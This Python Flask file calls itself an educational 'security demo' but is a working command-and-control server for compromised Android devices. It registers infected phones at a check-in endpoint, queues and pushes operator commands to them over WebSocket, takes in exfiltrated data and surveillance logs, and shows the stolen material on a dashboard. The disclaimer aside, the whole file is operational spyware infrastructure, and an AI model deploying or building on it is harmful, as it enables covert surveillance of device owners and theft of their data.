#!/usr/bin/env python3
"""
SECURITY DEMO: Command & Control Server

This server demonstrates how malware operators manage compromised devices:
- Web-based dashboard for device management
- Real-time communication with infected devices
- Data collection and analysis interface
- Command execution and payload deployment
- Encrypted communication channels

EDUCATIONAL PURPOSE ONLY - Shows real C2 server techniques
"""

import os
import json
import time
import base64
import hashlib
from datetime import datetime
from flask import Flask, render_template, request, jsonify, send_file
from flask_socketio import SocketIO, emit
import sqlite3
import threading

app = Flask(__name__)
app.config['SECRET_KEY'] = 'security_demo_c2_server_2024'
socketio = SocketIO(app, cors_allowed_origins="*")

# Global variables for C2 operations
active_devices = {}
command_queue = {}
stolen_data = {}

class C2Server:
    def __init__(self):
        self.db_path = 'c2_database.db'
        self.init_database()
        self.load_device_data()
        
    def init_database(self):
        """Initialize SQLite database for C2 operations"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        # Devices table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS devices (
                device_id TEXT PRIMARY KEY,
                device_name TEXT,
                android_version TEXT,
                first_seen TIMESTAMP,
                last_seen TIMESTAMP,
                ip_address TEXT,
                location TEXT,
                status TEXT,
                capabilities TEXT
            )
        ''')
        
        # Commands table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                command TEXT,
                parameters TEXT,
                timestamp TIMESTAMP,
                status TEXT,
                result TEXT
            )
        ''')
        
        # Data exfiltration table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS exfiltrated_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                data_type TEXT,
                data_content TEXT,
                timestamp TIMESTAMP,
                file_size INTEGER
            )
        ''')
        
        # Surveillance logs table
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS surveillance_logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                device_id TEXT,
                log_type TEXT,
                content TEXT,
                timestamp TIMESTAMP
            )
        ''')
        
        conn.commit()
        conn.close()
        
    def load_device_data(self):
        """Load existing device data from database"""
        conn = sqlite3.connect(self.db_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT * FROM devices WHERE status = 'online'")
        devices = cursor.fetchall()
        
        for device in devices:
            device_id = device[0]
            active_devices[device_id] = {
                'device_name': device[1],
                'android_version': device[2],
                'first_seen': device[3],
                'last_seen': device[4],
                'ip_address': device[5],
                'location': device[6],
                'capabilities': json.loads(device[7]) if device[7] else {}
            }
            
        conn.close()

c2_server = C2Server()

@app.route('/')
def dashboard():
    """Main C2 dashboard"""
    return render_template('dashboard.html')

@app.route('/devices')
def devices():
    """Device management interface"""
    return render_template('devices.html')

@app.route('/data')
def data_viewer():
    """Stolen data viewer interface"""
    return render_template('data.html')

@app.route('/surveillance')
def surveillance():
    """Surveillance monitoring interface"""
    return render_template('surveillance.html')

@app.route('/api/devices')
def api_devices():
    """API endpoint for device information"""
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT device_id, device_name, android_version, first_seen, last_seen, 
               ip_address, location, status, capabilities 
        FROM devices ORDER BY last_seen DESC
    """)
    
    devices = []
    for row in cursor.fetchall():
        devices.append({
            'device_id': row[0],
            'device_name': row[1],
            'android_version': row[2],
            'first_seen': row[3],
            'last_seen': row[4],
            'ip_address': row[5],
            'location': row[6],
            'status': row[7],
            'capabilities': json.loads(row[8]) if row[8] else {}
        })
    
    conn.close()
    return jsonify(devices)

@app.route('/api/device/<device_id>/commands')
def api_device_commands(device_id):
    """Get command history for a device"""
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT command, parameters, timestamp, status, result 
        FROM commands WHERE device_id = ? ORDER BY timestamp DESC LIMIT 50
    """, (device_id,))
    
    commands = []
    for row in cursor.fetchall():
        commands.append({
            'command': row[0],
            'parameters': row[1],
            'timestamp': row[2],
            'status': row[3],
            'result': row[4]
        })
    
    conn.close()
    return jsonify(commands)

@app.route('/api/device/<device_id>/data')
def api_device_data(device_id):
    """Get exfiltrated data for a device"""
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT data_type, data_content, timestamp, file_size 
        FROM exfiltrated_data WHERE device_id = ? ORDER BY timestamp DESC LIMIT 100
    """, (device_id,))
    
    data = []
    for row in cursor.fetchall():
        data.append({
            'data_type': row[0],
            'data_content': row[1][:500] if len(row[1]) > 500 else row[1],  # Truncate for display
            'timestamp': row[2],
            'file_size': row[3]
        })
    
    conn.close()
    return jsonify(data)

@app.route('/api/surveillance/logs')
def api_surveillance_logs():
    """Get recent surveillance logs"""
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        SELECT device_id, log_type, content, timestamp 
        FROM surveillance_logs ORDER BY timestamp DESC LIMIT 200
    """)
    
    logs = []
    for row in cursor.fetchall():
        logs.append({
            'device_id': row[0],
            'log_type': row[1],
            'content': row[2],
            'timestamp': row[3]
        })
    
    conn.close()
    return jsonify(logs)

@app.route('/api/statistics')
def api_statistics():
    """Get C2 server statistics"""
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    # Device statistics
    cursor.execute("SELECT COUNT(*) FROM devices")
    total_devices = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM devices WHERE status = 'online'")
    online_devices = cursor.fetchone()[0]
    
    # Data statistics
    cursor.execute("SELECT COUNT(*) FROM exfiltrated_data")
    total_data_points = cursor.fetchone()[0]
    
    cursor.execute("SELECT SUM(file_size) FROM exfiltrated_data")
    total_data_size = cursor.fetchone()[0] or 0
    
    # Command statistics
    cursor.execute("SELECT COUNT(*) FROM commands")
    total_commands = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM commands WHERE status = 'completed'")
    successful_commands = cursor.fetchone()[0]
    
    # Recent activity
    cursor.execute("""
        SELECT COUNT(*) FROM surveillance_logs 
        WHERE timestamp > datetime('now', '-1 hour')
    """)
    recent_activity = cursor.fetchone()[0]
    
    conn.close()
    
    return jsonify({
        'devices': {
            'total': total_devices,
            'online': online_devices,
            'offline': total_devices - online_devices
        },
        'data': {
            'total_points': total_data_points,
            'total_size_mb': round(total_data_size / (1024 * 1024), 2),
            'avg_per_device': round(total_data_points / max(total_devices, 1), 1)
        },
        'commands': {
            'total': total_commands,
            'successful': successful_commands,
            'success_rate': round((successful_commands / max(total_commands, 1)) * 100, 1)
        },
        'activity': {
            'recent_hour': recent_activity
        }
    })

@app.route('/api/device/<device_id>/command', methods=['POST'])
def api_send_command(device_id):
    """Send command to a specific device"""
    command_data = request.json
    command = command_data.get('command')
    parameters = command_data.get('parameters', '{}')
    
    # Store command in database
    conn = sqlite3.connect(c2_server.db_path)
    cursor = conn.cursor()
    
    cursor.execute("""
        INSERT INTO commands (device_id, command, parameters, timestamp, status)
        VALUES (?, ?, ?, ?, ?)
    """, (device_id, command, parameters, datetime.now().isoformat(), 'pending'))
    
    command_id = cursor.lastrowid
    conn.commit()
    conn.close()
    
    # Add to command queue for device
    if device_id not in command_queue:
        command_queue[device_id] = []
    
    command_queue[device_id].append({
        'id': command_id,
        'command': command,
        'parameters': json.loads(parameters),
        'timestamp': datetime.now().isoformat()
    })
    
    # Notify device via WebSocket if connected
    socketio.emit('new_command', {
        'command_id': command_id,
        'command': command,
        'parameters': json.loads(parameters)
    }, room=device_id)
    
    return jsonify({'status': 'success', 'command_id': command_id})

# Android device communication endpoints
@app.route('/api/android/checkin', methods=['POST'])
def android_checkin():
    """Device check-in endpoint"""
    try:
        device_data = request.json
        device_id = device_data.get('device_id')
        
        if not device_id:
            return jsonify({'error': 'Device ID required'}), 400
        
        # Update device information
        conn = sqlite3.connect(c2_server.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT OR REPLACE INTO devices 
            (device_id, device_name, android_version, first_seen, last_seen, 
             ip_address, location, status, capabilities)
            VALUES (?, ?, ?, COALESCE((SELECT first_seen FROM devices WHERE device_id = ?), ?), ?, ?, ?, ?, ?)
        """, (
            device_id,
            device_data.get('device_name', 'Unknown'),
            device_data.get('android_version', 'Unknown'),
            device_id,
            datetime.now().isoformat(),
            datetime.now().isoformat(),
            request.remote_addr,
            device_data.get('location', 'Unknown'),
            'online',
            json.dumps(device_data.get('capabilities', {}))
        ))
        
        conn.commit()
        conn.close()
        
        # Update active devices
        active_devices[device_id] = {
            'device_name': device_data.get('device_name', 'Unknown'),
            'android_version': device_data.get('android_version', 'Unknown'),
            'last_seen': datetime.now().isoformat(),
            'ip_address': request.remote_addr,
            'location': device_data.get('location', 'Unknown'),
            'capabilities': device_data.get('capabilities', {})
        }
        
        # Return pending commands
        pending_commands = command_queue.get(device_id, [])
        command_queue[device_id] = []  # Clear after sending
        
        # Emit device update via WebSocket
        socketio.emit('device_update', {
            'device_id': device_id,
            'status': 'online',
            'last_seen': datetime.now().isoformat()
        }, broadcast=True)
        
        return jsonify({
            'status': 'success',
            'commands': pending_commands,
            'server_time': datetime.now().isoformat()
        })
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android/upload_data', methods=['POST'])
def android_upload_data():
    """Data upload endpoint for Android devices"""
    try:
        upload_data = request.json
        device_id = upload_data.get('device_id')
        data_type = upload_data.get('data_type')
        data_content = upload_data.get('data_content')
        
        if not all([device_id, data_type, data_content]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store data in database
        conn = sqlite3.connect(c2_server.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO exfiltrated_data (device_id, data_type, data_content, timestamp, file_size)
            VALUES (?, ?, ?, ?, ?)
        """, (
            device_id,
            data_type,
            data_content,
            datetime.now().isoformat(),
            len(data_content)
        ))
        
        conn.commit()
        conn.close()
        
        # Emit data update via WebSocket
        socketio.emit('new_data', {
            'device_id': device_id,
            'data_type': data_type,
            'size': len(data_content),
            'timestamp': datetime.now().isoformat()
        }, broadcast=True)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/android/log', methods=['POST'])
def android_log():
    """Surveillance log endpoint"""
    try:
        log_data = request.json
        device_id = log_data.get('device_id')
        log_type = log_data.get('log_type')
        content = log_data.get('content')
        
        if not all([device_id, log_type, content]):
            return jsonify({'error': 'Missing required fields'}), 400
        
        # Store log in database
        conn = sqlite3.connect(c2_server.db_path)
        cursor = conn.cursor()
        
        cursor.execute("""
            INSERT INTO surveillance_logs (device_id, log_type, content, timestamp)
            VALUES (?, ?, ?, ?)
        """, (device_id, log_type, content, datetime.now().isoformat()))
        
        conn.commit()
        conn.close()
        
        # Emit log update via WebSocket
        socketio.emit('new_log', {
            'device_id': device_id,
            'log_type': log_type,
            'content': content,
            'timestamp': datetime.now().isoformat()
        }, broadcast=True)
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# WebSocket events
@socketio.on('connect')
def handle_connect():
    """Handle WebSocket connection"""
    print(f"Client connected: {request.sid}")
    emit('server_status', {'status': 'connected', 'time': datetime.now().isoformat()})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle WebSocket disconnection"""
    print(f"Client disconnected: {request.sid}")

@socketio.on('join_device')
def handle_join_device(data):
    """Join device-specific room for targeted communication"""
    device_id = data.get('device_id')
    if device_id:
        join_room(device_id)
        emit('joined_device', {'device_id': device_id})

def cleanup_offline_devices():
    """Background task to mark offline devices"""
    while True:
        try:
            conn = sqlite3.connect(c2_server.db_path)
            cursor = conn.cursor()
            
            # Mark devices offline if not seen in 5 minutes
            cursor.execute("""
                UPDATE devices SET status = 'offline' 
                WHERE last_seen < datetime('now', '-5 minutes') AND status = 'online'
            """)
            
            conn.commit()
            conn.close()
            
            time.sleep(60)  # Check every minute
            
        except Exception as e:
            print(f"Cleanup error: {e}")
            time.sleep(60)

if __name__ == '__main__':
    print("ðŸš¨ SECURITY DEMO: C2 Server Starting")
    print("âš ï¸  FOR EDUCATIONAL PURPOSES ONLY")
    print("ðŸŒ Dashboard: http://localhost:5000")
    print("ðŸ“¡ Android endpoint: http://localhost:5000/api/android/")
    
    # Start cleanup thread
    cleanup_thread = threading.Thread(target=cleanup_offline_devices, daemon=True)
    cleanup_thread.start()
    
    # Start C2 server
    socketio.run(app, host='0.0.0.0', port=5000, debug=True)
